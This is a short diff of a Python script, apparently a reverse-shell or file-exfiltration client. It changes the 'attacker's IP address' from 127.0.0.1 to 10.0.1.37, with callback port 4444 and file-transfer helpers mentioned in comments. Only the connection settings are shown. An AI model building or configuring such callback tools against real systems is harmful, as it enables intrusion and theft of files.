@@ -5,7 +5,7 @@ import base64
 import json
 
 # Set up the target server and port (attacker's machine)
-HOST = "127.0.0.1"  # Replace with the attacker's IP address
+HOST = "10.0.1.37"  # Replace with the attacker's IP address
 PORT = 4444         # Replace with the port the attacker is listening on
 
 # Helper functions for file transfer
